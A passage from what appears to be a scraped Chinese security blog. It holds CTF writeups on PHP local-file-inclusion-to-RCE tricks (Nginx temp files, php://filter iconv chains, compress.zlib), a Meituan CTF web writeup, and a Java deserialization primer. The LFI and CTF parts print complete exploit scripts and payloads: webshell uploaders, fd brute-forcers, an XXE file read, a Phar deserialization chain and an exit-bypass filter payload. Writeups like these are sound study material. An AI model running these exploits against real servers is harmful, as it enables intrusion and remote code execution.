docker的制作方式都是这个），那么这个环境就和P牛所说的环境有两个不同：\npearcmd.php在/usr/share/php/pearcmd.php register_argc_argv在php.ini中默认关闭 如果说第一个还可以调整，那么第二个限制则是致命的。\n可能是我的运气比较好，也可能是我比较懒，easywill的环境我刚好是根据php官方镜像搭建的，所以没踩到这个坑。\n利用 Nginx 产生临时文件 这个技巧来源于hxp2021，不过我并没有打这个比赛，而是如开头所说通过p牛的星球了解到的，看了Zeddy大佬的文章只能说叹为观止。\n总结起来整个过程就是：\n让后端 php 请求一个过大的文件 Fastcgi 返回响应包过大，导致 Nginx 需要产生临时文件进行缓存 虽然 Nginx 删除了/var/lib/nginx/fastcgi下的临时文件，但是在 /proc/pid/fd/ 下我们可以找到被删除的文件 遍历 pid 以及 fd ，使用多重链接绕过 PHP 包含策略完成 LFI 这里直接用出题人的exp改了一下：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 #!/usr/bin/env python3 import sys, threading, requests # exploit PHP local file inclusion (LFI) via nginx\u0026#39;s client body buffering assistance # see https://bierbaumer.net/security/php-lfi-with-nginx-assistance/ for details URL = f\u0026#39;http://{sys.argv[1]}:{sys.argv[2]}/index.php\u0026#39; # find nginx worker processes r = requests.get(URL, params={ \u0026#39;name\u0026#39;: \u0026#39;cfile\u0026#39;, \u0026#39;value\u0026#39;: \u0026#39;/proc/cpuinfo\u0026#39; }) cpus = r.text.count(\u0026#39;processor\u0026#39;) r = requests.get(URL, params={ \u0026#39;name\u0026#39;: \u0026#39;cfile\u0026#39;, \u0026#39;value\u0026#39;: \u0026#39;/proc/sys/kernel/pid_max\u0026#39; }) pid_max = int(r.text) print(f\u0026#39;[*] cpus: {cpus}; pid_max: {pid_max}\u0026#39;) nginx_workers = [] for pid in range(pid_max): r = requests.get(URL, params={ \u0026#39;name\u0026#39;: \u0026#39;cfile\u0026#39;, \u0026#39;value\u0026#39;: f\u0026#39;/proc/{pid}/cmdline\u0026#39; }) if b\u0026#39;nginx: worker process\u0026#39; in r.content: print(f\u0026#39;[*] nginx worker found: {pid}\u0026#39;) nginx_workers.append(pid) if len(nginx_workers) \u0026gt;= cpus: break done = False # upload a big client body to force nginx to create a /var/lib/nginx/body/$X def uploader(): print(\u0026#39;[+] starting uploader\u0026#39;) while not done: requests.get(URL, data=\u0026#39;\u0026lt;?php system($_GET[\u0026#34;c\u0026#34;]); /*\u0026#39; + 16*1024*\u0026#39;A\u0026#39;) for _ in range(16): t = threading.Thread(target=uploader) t.start() # brute force nginx\u0026#39;s fds to include body files via procfs # use ../../ to bypass include\u0026#39;s readlink / stat problems with resolving fds to `/var/lib/nginx/body/0000001150 (deleted)` def bruter(pid): global done while not done: print(f\u0026#39;[+] brute loop restarted: {pid}\u0026#39;) for fd in range(4, 32): f = f\u0026#39;/proc/self/fd/{pid}/../../../{pid}/fd/{fd}\u0026#39; r = requests.get(URL, params={ \u0026#39;name\u0026#39;: \u0026#39;cfile\u0026#39;, \u0026#39;value\u0026#39;: f, \u0026#39;c\u0026#39;: f\u0026#39;id\u0026#39; }) if \u0026#39;uid\u0026#39; in r.text: print(f\u0026#39;[!] {f}: {r.text}\u0026#39;) done = True exit() for pid in nginx_workers: a = threading.Thread(target=bruter, args=(pid, )) a.start() 原本是直接拿php官方镜像搭的的环境，结果发现官方镜像只有php-apache，没有nginx，然后自己又搭了一会儿nginx，以及刚开始跑脚本跑出来了log，应该是willphp框架打开的log，后面加了“uid”的判断条件就能正常把id跑出来了\n使用php://filter将任意文件转换成Webshell 这个来源于hxp2021的另一题counter，国外一个大佬的非预期解法：https://gist.github.com/loknop/b27422d355ea1fd0d90d6dbc1e278d4d\n这里主要参考Zeddy师傅的文章，看之前已经大概知道了这个trick的思路，当时已经十分震惊了，但是当我看到文章里令人眼花缭乱的字符集转换，最后转换出了webshell，再一次被震撼到了，真的太牛了\n主要的思路就是利用php伪协议的转换过滤器，通过字符集转换来生成特定的内容，同时利用base64“宽松的解析”（当需要解析的字符串中含有base64表中不存在的字符时，不会报错，而是将其丢弃并继续解析），将其中不可见的字符丢掉，只剩下我们想要的结果。\n读完上面这段话我们就会发现，如何利用字符集转换生成我们想要的内容（filter chain的寻找）其实是这个trick的核心部分，Zeddy的文章中有讲到该如何fuzz，同时wupco师傅也给出了现成的结果以及fuzz脚本：https://github.com/wupco/PHP_INCLUDE_TO_SHELL_CHAR_DICT\n这里回到我们的easywill，稍微修改一下国外大佬的exp：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 import requests url = \u0026#34;http://ip:port/index.php\u0026#34; file_to_use = \u0026#34;/etc/passwd\u0026#34; command = \u0026#34;id\u0026#34; #\u0026lt;?=`$_GET[0]`;;?\u0026gt; base64_payload = \u0026#34;PD89YCRfR0VUWzBdYDs7Pz4\u0026#34; conversions = { \u0026#39;R\u0026#39;: \u0026#39;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.MAC.UCS2\u0026#39;, \u0026#39;B\u0026#39;: \u0026#39;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.CP1256.UCS2\u0026#39;, \u0026#39;C\u0026#39;: \u0026#39;convert.iconv.UTF8.CSISO2022KR\u0026#39;, \u0026#39;8\u0026#39;: \u0026#39;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L6.UCS2\u0026#39;, \u0026#39;9\u0026#39;: \u0026#39;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.ISO6937.JOHAB\u0026#39;, \u0026#39;f\u0026#39;: \u0026#39;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L7.SHIFTJISX0213\u0026#39;, \u0026#39;s\u0026#39;: \u0026#39;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L3.T.61\u0026#39;, \u0026#39;z\u0026#39;: \u0026#39;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L7.NAPLPS\u0026#39;, \u0026#39;U\u0026#39;: \u0026#39;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.CP1133.IBM932\u0026#39;, \u0026#39;P\u0026#39;: \u0026#39;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.UCS-2LE.UCS-2BE|convert.iconv.TCVN.UCS2|convert.iconv.857.SHIFTJISX0213\u0026#39;, \u0026#39;V\u0026#39;: \u0026#39;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.UCS-2LE.UCS-2BE|convert.iconv.TCVN.UCS2|convert.iconv.851.BIG5\u0026#39;, \u0026#39;0\u0026#39;: \u0026#39;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.UCS-2LE.UCS-2BE|convert.iconv.TCVN.UCS2|convert.iconv.1046.UCS2\u0026#39;, \u0026#39;Y\u0026#39;: \u0026#39;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.ISO-IR-111.UCS2\u0026#39;, \u0026#39;W\u0026#39;: \u0026#39;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.851.UTF8|convert.iconv.L7.UCS2\u0026#39;, \u0026#39;d\u0026#39;: \u0026#39;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.ISO-IR-111.UJIS|convert.iconv.852.UCS2\u0026#39;, \u0026#39;D\u0026#39;: \u0026#39;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.SJIS.GBK|convert.iconv.L10.UCS2\u0026#39;, \u0026#39;7\u0026#39;: \u0026#39;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.EUCTW|convert.iconv.L4.UTF8|convert.iconv.866.UCS2\u0026#39;, \u0026#39;4\u0026#39;: \u0026#39;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.EUCTW|convert.iconv.L4.UTF8|convert.iconv.IEC_P271.UCS2\u0026#39; } # generate some garbage base64 filters = \u0026#34;convert.iconv.UTF8.CSISO2022KR|\u0026#34; filters += \u0026#34;convert.base64-encode|\u0026#34; # make sure to get rid of any equal signs in both the string we just generated and the rest of the file filters += \u0026#34;convert.iconv.UTF8.UTF7|\u0026#34; for c in base64_payload[::-1]: filters += conversions[c] + \u0026#34;|\u0026#34; # decode and reencode to get rid of everything that isn\u0026#39;t valid base64 filters += \u0026#34;convert.base64-decode|\u0026#34; filters += \u0026#34;convert.base64-encode|\u0026#34; # get rid of equal signs filters += \u0026#34;convert.iconv.UTF8.UTF7|\u0026#34; filters += \u0026#34;convert.base64-decode\u0026#34; final_payload = f\u0026#34;php://filter/{filters}/resource={file_to_use}\u0026#34; r = requests.get(url, params={ \u0026#34;0\u0026#34;: command, \u0026#34;name\u0026#34;: \u0026#34;cfile\u0026#34;, \u0026#34;value\u0026#34;: final_payload }) print(r.text) 限制 这个trick的限制无论是上午Smity师傅的文章还是Zeddy师傅的文章下面的评论都有提到过，就是某些字符集在某些系统并不支持，比如Ubuntu18.04，十分幸运，php官方带apache的镜像是Debain，运行上面的脚本没有任何问题，这里猜测hxp2021的出题人用的也是同一个镜像（xs）\n解决的办法其实并不难，只需要将新的字符集放到wupco师傅的脚本中再跑一次就可以了，这里直接使用Smity师傅下午新发的exp：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 import requests #参数file url = \u0026#34;http://192.168.190.191/index.php\u0026#34; file_to_use = \u0026#34;index\u0026#34; command = \u0026#34;whoami\u0026#34; #\u0026lt;?=`$_GET[0]`;;?\u0026gt; base64_payload = \u0026#34;PD89YCRfR0VUWzBdYDs7Pz4\u0026#34; conversions = { \u0026#39;R\u0026#39;: \u0026#39;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.MAC.UCS2\u0026#39;, \u0026#39;B\u0026#39;: \u0026#39;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.CP1256.UCS2\u0026#39;, \u0026#39;C\u0026#39;: \u0026#39;convert.iconv.UTF8.CSISO2022KR\u0026#39;, \u0026#39;8\u0026#39;: \u0026#39;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L6.UCS2\u0026#39;, \u0026#39;9\u0026#39;: \u0026#39;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.ISO6937.JOHAB\u0026#39;, \u0026#39;f\u0026#39;: \u0026#39;convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213\u0026#39;, \u0026#39;s\u0026#39;: \u0026#39;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L3.T.61\u0026#39;, \u0026#39;z\u0026#39;: \u0026#39;convert.iconv.865.UTF16|convert.iconv.CP901.ISO6937\u0026#39;, \u0026#39;U\u0026#39;: \u0026#39;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.CP1133.IBM932\u0026#39;, \u0026#39;P\u0026#39;: \u0026#39;convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB\u0026#39;, \u0026#39;V\u0026#39;: \u0026#39;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.UCS-2LE.UCS-2BE|convert.iconv.TCVN.UCS2|convert.iconv.851.BIG5\u0026#39;, \u0026#39;0\u0026#39;: \u0026#39;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.UCS-2LE.UCS-2BE|convert.iconv.TCVN.UCS2|convert.iconv.1046.UCS2\u0026#39;, \u0026#39;Y\u0026#39;: \u0026#39;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.ISO-IR-111.UCS2\u0026#39;, \u0026#39;W\u0026#39;: \u0026#39;convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936\u0026#39;, \u0026#39;d\u0026#39;: \u0026#39;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.ISO-IR-111.UJIS|convert.iconv.852.UCS2\u0026#39;, \u0026#39;D\u0026#39;: \u0026#39;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.SJIS.GBK|convert.iconv.L10.UCS2\u0026#39;, \u0026#39;7\u0026#39;: \u0026#39;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.EUCTW|convert.iconv.L4.UTF8|convert.iconv.866.UCS2\u0026#39;, \u0026#39;4\u0026#39;: \u0026#39;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.EUCTW|convert.iconv.L4.UTF8|convert.iconv.IEC_P271.UCS2\u0026#39; } # generate some garbage base64 filters = \u0026#34;convert.iconv.UTF8.CSISO2022KR|\u0026#34; filters += \u0026#34;convert.base64-encode|\u0026#34; # make sure to get rid of any equal signs in both the string we just generated and the rest of the file filters += \u0026#34;convert.iconv.UTF8.UTF7|\u0026#34; for c in base64_payload[::-1]: filters += conversions[c] + \u0026#34;|\u0026#34; # decode and reencode to get rid of everything that isn\u0026#39;t valid base64 filters += \u0026#34;convert.base64-decode|\u0026#34; filters += \u0026#34;convert.base64-encode|\u0026#34; # get rid of equal signs filters += \u0026#34;convert.iconv.UTF8.UTF7|\u0026#34; filters += \u0026#34;convert.base64-decode\u0026#34; final_payload = f\u0026#34;php://filter/{filters}/resource={file_to_use}\u0026#34; print(final_payload) r = requests.get(url, params={ \u0026#34;0\u0026#34;: command, #\u0026#34;action\u0026#34;: \u0026#34;include\u0026#34;, \u0026#34;file\u0026#34;: final_payload }) print(r.text) 使用compress.zlib://生成临时文件 这个是2019年hxp36c3ctf里面includer的预期解（hxp也太爱LFI了吧），对其他师傅们来说好像不是新姿势了，不过我是通过includer's revenge以及师傅们的文章才知道有这个方法（有递归复习内味了）\n这里还是学习Zeddy师傅的文章，除此之外还有balsn队伍的writeup，大概的意思就是通过对php-src源代码的分析，发现可以使用compress.zip://流上传任意文件（compress.zip://http或者compress.zip://ftp，前提是开启allow_url_include），在此过程中会生成临时文件，然后再经过一系列操作之后绕过WAF并且保存临时文件，最终实现RCE\n最后看下来好像这个方法并没有特别的惊艳，特别是需要开启allow_url_include，而这个配置php默认是关闭的。\n因为这个方法需要搭配特定的配置（nginx配置漏洞导致目录遍历）以及WAF（过滤\u0026lt;?），所以就没有折腾我们可怜的willphp进行复现了。\n最后 全篇文章没写什么深入的东西，因为确实没办法写的比上面那些师傅更好，只是单纯做个记录方便自己查阅吧，感兴趣的师傅可以点开其他师傅的文章深入学习。\n参考 Docker PHP裸文件本地包含综述 | 离别歌 (leavesongs.com)\n利用pearcmd.php从LFI到getshell_feng的博客-CSDN博客\nhxp CTF 2021 - A New Novel LFI - 跳跳糖 (tttang.com)\n0xbb - PHP LFI with Nginx Assistance (bierbaumer.net)\nhxp CTF 2021 - The End Of LFI? - 跳跳糖 (tttang.com)\nSolving \u0026ldquo;includer\u0026rsquo;s revenge\u0026rdquo; from hxp ctf 2021 without controlling any files (github.com)\nGitHub - wupco/PHP_INCLUDE_TO_SHELL_CHAR_DICT\n36c3 Web 学习记录 (zeddyu.info)\n","date":"2022-01-10T10:10:38+08:00","permalink":"https://k1te.cn/p/lfi-%E6%96%B0%E5%A7%BF%E5%8A%BF%E5%AD%A6%E4%B9%A0/","title":"LFI 新姿势学习"},{"content":"跟着队友学到了不少东西\nHackMe 随便上传一个东西显示“HACK! I filtered all the characters.”，尝试上传一个a，发现可以，上传aa不行，上传a a可以，猜测是字符不能连在一起，可以用utf-16绕过，随便拿个jsp马转成utf-16即可：\n然后上传成功之后会显示一个地址upload/1b5337d0c8ad813197b506146d8d503d/yyyyMMddhhmmssSSS.jsp，后面hint出来才知道这个yyyyMMddhhmmssSSS是上传时的时间戳，最后的SSS是毫秒，我们可以简单写个脚本来爆：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 from os import name import requests import time import sys import threading def func(fname): res = requests.get(fname) if \u0026#34;Something went wrong\u0026#34; not in res.text: print(fname) sys.exit(0) url = \u0026#34;http://127.0.0.1:49154\u0026#34; file = \u0026#34;shell.jsp\u0026#34; files = {\u0026#34;file\u0026#34;: open(file, \u0026#34;rb\u0026#34;)} prev = time.strftime(\u0026#34;%Y%m%d%H%M%S\u0026#34;, time.localtime()) # prev = \u0026#34;20211212172308\u0026#34; print(prev) res = requests.post(url + \u0026#34;/UploadServlet\u0026#34;, files=files) # print(res.text) start = time.strftime(\u0026#34;%Y%m%d%H%M%S\u0026#34;, time.localtime()) print(start) for i in range(5): for j in range(1000): fname = f\u0026#34;{url}/page.jsp?file=upload/1b5337d0c8ad813197b506146d8d503d/{int(prev) + i}{str(j).zfill(3)}\u0026#34; # print(fname) thread = threading.Thread(target=func, args=(fname,)) thread.start() UpStorage 登录的时候抓包，发现传的是xml，直接xxe读源码：\n1 2 3 4 5 \u0026lt;?xml version=\u0026#34;1.0\u0026#34;?\u0026gt; \u0026lt;!DOCTYPE convert [ \u0026lt;!ENTITY file SYSTEM \u0026#34;php://filter/read=convert.base64-encode/resource=class.php\u0026#34;\u0026gt; ]\u0026gt; \u0026lt;user\u0026gt;\u0026lt;username\u0026gt;\u0026amp;file;\u0026lt;/username\u0026gt;\u0026lt;password\u0026gt;dfsaa\u0026lt;/password\u0026gt;\u0026lt;/user\u0026gt; 文件上传+LFI+class，很容易想到Phar反序列化，exp：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 132 133 134 135 136 137 138 139 \u0026lt;?php //error_reporting(0); //$dbaddr = \u0026#34;127.0.0.1\u0026#34;; //$dbuser = \u0026#34;root\u0026#34;; //$dbpass = \u0026#34;\u0026#34;; //$dbname = \u0026#34;ctf\u0026#34;; //$db = new mysqli($dbaddr, $dbuser, $dbpass, $dbname); abstract class Users { public $db; abstract public function verify_user($username, $password); abstract public function check_user_exist($username); abstract public function add_user($username, $password); abstract protected function eval(); public function test() { $this-\u0026gt;eval(); } } class User extends Users { public $db; private $func; protected $param; public function __construct() { $this-\u0026gt;func = \u0026#34;call_user_func\u0026#34;; $this-\u0026gt;param = array(\u0026#34;Logs\u0026#34;,\u0026#34;log\u0026#34;); } protected function eval() { if (is_array($this-\u0026gt;param)) { ($this-\u0026gt;func)($this-\u0026gt;param); } else { die(\u0026#34;no!\u0026#34;); } } public function verify_user($username, $password) { // TODO: Implement verify_user() method. } public function check_user_exist($username) { // TODO: Implement check_user_exist() method. } public function add_user($username, $password) { // TODO: Implement add_user() method. } } class Welcome{ public $file; public $username; public $password; public $verify; public $greeting; public function __construct($username) { $this-\u0026gt;username = $username; $this-\u0026gt;password = \u0026#34;index.php\u0026#34;; } public function __toString(){ return $this-\u0026gt;verify-\u0026gt;verify_user($this-\u0026gt;username,$this-\u0026gt;password); } public function __wakeup(){ $this-\u0026gt;greeting = \u0026#34;Welcome \u0026#34;.$this-\u0026gt;username.\u0026#34;:)\u0026#34;; } } class File { public $filename; public $fileext; public $basename; public function __construct() { $this-\u0026gt;filename = new User(); } public function check_file_exist($filename) { if (file_exists($filename) \u0026amp;\u0026amp; !is_dir($filename)) { return true; } else { return false; } } public function __call($func, $params) { foreach($params as $param){ if($this-\u0026gt;check_file_exist($param)) { $this-\u0026gt;filename-\u0026gt;test(); } } } } class Logs { public $log; public function log() { $log = $_GET[\u0026#39;log\u0026#39;]; if(preg_match(\u0026#34;/rot13|base|toupper|encode|decode|convert|bzip2/i\u0026#34;, $log)) { die(\u0026#34;hack!\u0026#34;); } file_put_contents($log,\u0026#39;\u0026lt;?php exit();\u0026#39;.$log); } } $welcome1 = new Welcome(\u0026#34;index.php\u0026#34;); $welcome1-\u0026gt;verify = new File(); $welcome2 = new Welcome($welcome1); @unlink(\u0026#34;phar.phar\u0026#34;); $phar = new Phar(\u0026#34;phar.phar\u0026#34;); //后缀名必须为phar $phar-\u0026gt;startBuffering(); $phar-\u0026gt;setStub(\u0026#34;\u0026lt;?php __HALT_COMPILER(); ?\u0026gt;\u0026#34;); //设置stub $phar-\u0026gt;setMetadata($welcome2); //将自定义的meta-data存入manifest $phar-\u0026gt;addFromString(\u0026#34;test.txt\u0026#34;, \u0026#34;test\u0026#34;); //添加要压缩的文件 //签名自动计算 $phar-\u0026gt;stopBuffering(); log处的死亡exit绕过可以参考2020WMCTF的checkin，payload：php://filter/zlib.deflate|string.tolower|zlib.inflate|?\u0026gt;\u0026lt;?php%0deval($_GET[1]);?\u0026gt;/resource=shell.php ","date":"2021-12-13T15:51:24+08:00","permalink":"https://k1te.cn/p/2021%E7%BE%8E%E5%9B%A2%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E9%AB%98%E6%A0%A1%E6%8C%91%E6%88%98%E8%B5%9Bweb%E9%83%A8%E5%88%86wp/","title":"2021美团网络安全高校挑战赛web部分wp"},{"content":"Java入门的简单基础，包括序列化反序列化、反射、类的动态加载，动态代理暂时还没用到，后面用到再加上。\n序列化和反序列化 Java序列化是指把Java对象转换为字节序列的过程；而Java反序列化是指把字节序列恢复为Java对象的过程。\n用处 想把内存中的对象保存到一个文件中或者数据库中时候； 想用套接字在网络上传送对象的时候； 想通过RMI传输对象的时候 实现 只有实现了Serializable或者Externalizable接口的类的对象才能被序列化为字节序列。（不是则会抛出异常）\n通过 ObjectOutStream 包装 FileOutStream或者ByteArrayInputStream\n同理，可以通过 ObjectInputStream 将数据从磁盘 FileInputStream 或者内存 ByteArrayInputStream 读取出来然后转化为指定的对象\nObjectOutputStream代表对象输出流：\n它的writeObject(Object obj)方法可对参数指定的obj对象进行序列化，把得到的字节序列写到一个目标输出流中。 ObjectInputStream代表对象输入流：\n它的readObject()方法从一个源输入流中读取字节序列，再把它们反序列化为一个对象，并将其返回。 例子 Person.java\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 public class Person implements Serializable { private String name; private int age; public Person(){} public Person(String name, int age) { this.name = name; this.age = age; } @Override public String toString() { return \u0026#34;Person{\u0026#34; + \u0026#34;name=\u0026#39;\u0026#34; + name + \u0026#39;\\\u0026#39;\u0026#39; + \u0026#34;, age=\u0026#34; + age + \u0026#39;}\u0026#39;; } } SerializeTest.java\n1 2 3 4 5 6 7 8 9 10 11 12 13 public class SerializeTest { public static void serialize(Object obj) throws IOException{ ObjectOutputStream objectOutputStream = new ObjectOutputStream(new FileOutputStream(\u0026#34;person.ser\u0026#34;)); objectOutputStream.writeObject(obj); } public static void main(String[] args) throws IOException { Person person = new Person(\u0026#34;a\u0026#34;,22); // System.out.println(person); serialize(person); } } Unserialize.java\n1 2 3 4 5 6 7 8 9 10 11 12 public class UnserializeTest { public static Object unserialize(String filename) throws IOException, ClassNotFoundException { ObjectInputStream objectInputStream = new ObjectInputStream(new FileInputStream(filename)); Object obj = objectInputStream.readObject(); return obj; } public static void main(String[] args) throws IOException, ClassNotFoundException { Person person = (Person) unserialize(\u0026#34;person.ser\u0026#34;); System.out.println(person); } } 其他需要注意的点 静态成员变量是不能被序列化 transient 标识的对象成员变量不参与序列化 重写writeObject和readObject方法 使用transient关键字阻止序列化虽然简单方便，但被它修饰的属性被完全隔离在序列化机制之外，导致了在反序列化时无法获取该属性的值，而通过在需要序列化的对象的Java类里加入writeObject()方法与readObject()方法可以控制如何序列化各属性，甚至完全不序列化某些属性或者加密序列化某些属性。\nexample:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 public class MyList implements Serializable { private String name; /* transient 表示该成员 arr 不需要被序列化 */ private transient Object[] arr; public MyList() { } public MyList(String name) { this.name = name; this.arr = new Object[100]; /* 给前面30个元素进行初始化 */ for (int i = 0; i \u0026lt; 30; i++) { this.arr[i] = i; } } @Override public String toString() { return \u0026#34;MyList{\u0026#34; + \u0026#34;name=\u0026#39;\u0026#34; + name + \u0026#39;\\\u0026#39;\u0026#39; + \u0026#34;, arr=\u0026#34; + Arrays.toString(arr) + \u0026#39;}\u0026#39;; } //-------------------------- 自定义序列化反序列化 arr 元素 ------------------ /** * Save the state of the \u0026lt;tt\u0026gt;ArrayList\u0026lt;/tt\u0026gt; instance to a stream (that * is, serialize it). * * @serialData The length of the array backing the \u0026lt;tt\u0026gt;ArrayList\u0026lt;/tt\u0026gt; * instance is emitted (int), followed by all of its elements * (each an \u0026lt;tt\u0026gt;Object\u0026lt;/tt\u0026gt;) in the proper order. */ private void writeObject(java.io.ObjectOutputStream s) throws java.io.IOException { //执行 JVM 默认的序列化操作 s.defaultWriteObject(); //手动序列化 arr 前面30个元素 for (int i = 0; i \u0026lt; 30; i++) { s.writeObject(arr[i]); } } /** * Reconstitute the \u0026lt;tt\u0026gt;ArrayList\u0026lt;/tt\u0026gt; instance from a stream (that is, * deserialize it). */ private void readObject(java.io.ObjectInputStream s) throws java.io.IOException, ClassNotFoundException { s.defaultReadObject(); arr = new Object[30]; // Read in all elements in the proper order. for (int i = 0; i \u0026lt; 30; i++) { arr[i] = s.readObject(); } } } 安全问题的产生 只要服务端反序列化数据，客户端传递的类的readObject中的代码就会自动执行，给予攻击者在服务器上运行代码的能力。\n可能的形式 入口类的readObject直接调用危险方法。 入口类参数中包含可控类，该类有危险方法，readObject时调用。 入口类参数中包含可控类，该类又调用其他有危险方法的类，readObject时调用。 构造函数/静态代码块等在类加载时隐式执行 利用 入口类 重写readObject readObject调用常见函数 参数类型宽泛 最好jdk自带 调用链 gadget chain 相同名称，相同类型 执行类 URLDNS 最简单的链，检测反序列化位点\n1 2 3 4 5 * Gadget Chain: * HashMap.readObject() * HashMap.putVal() * HashMap.hash() * URL.hashCode() 然而put的时候直接调用了hashCode，需要通过反射改变已有对象的属性。\n注意，java有dns缓存，所以同一个url，只会dns解析一次，后面都会直接在缓存里面找\n拓展 Serializable 接口\n一个对象想要被序列化，那么它的类就要实现此接口或者它的子接口。\n这个对象的所有属性（包括private属性、包括其引用的对象）都可以被序列化和反序列化来保存、传递。不想序列化的字段可以使用transient修饰。\n由于Serializable对象完全以它存储的二进制位为基础来构造，因此并不会调用任何构造函数，因此Serializable类无需默认构造函数，但是当Serializable类的父类没有实现Serializable接口时，反序列化过程会调用父类的默认构造函数，因此该父类必需有默认构造函数，否则会抛异常。\n使用transient关键字阻止序列化虽然简单方便，但被它修饰的属性被完全隔离在序列化机制之外，导致了在反序列化时无法获取该属性的值，而通过在需要序列化的对象的Java类里加入writeObject()方法与readObject()方法可以控制如何序列化各属性，甚至完全不序列化某些属性或者加密序列化某些属性。\nExternalizable 接口\n它是Serializable接口的子类，用户要实现的writeExternal()和readExternal() 方法，用来决定如何序列化和反序列化。\n因为序列化和反序列化方法需要自己实现，因此可以指定序列化哪些属性，而transient在这里无效。\n对Externalizable对象反序列化时，会先调用类的无参构造方法，这是有别于默认反序列方式的。如果把类的不带参数的构造方法删除，或者把该构造方法的访问权限设置为private、默认或protected级别，会抛出java.io.InvalidException: no valid constructor异常，因此Externalizable对象必须有默认构造函数，而且必需是public的。\n反射 Java 的反射机制是指在运行状态中，对于任意一个类都能够知道这个类所有的属性和方法； 并且对于任意一个对象，都能够调用它的任意一个方法；这种动态获取信息以及动态调用对象方法的功能成为Java语言的反射机制。\n总的来时，反射赋予Java动态特性\n反射的基本使用 获取Class对象 使用Class.forName 静态方法\n1 Class class1 = Class.forName(\u0026#34;Person\u0026#34;); 使用类的.class静态属性\n1 Class class2 = Person.class; 使用实例对象的getClass()方法\n1 2 Person person = new Person(); Class class3 = person.getClass(); 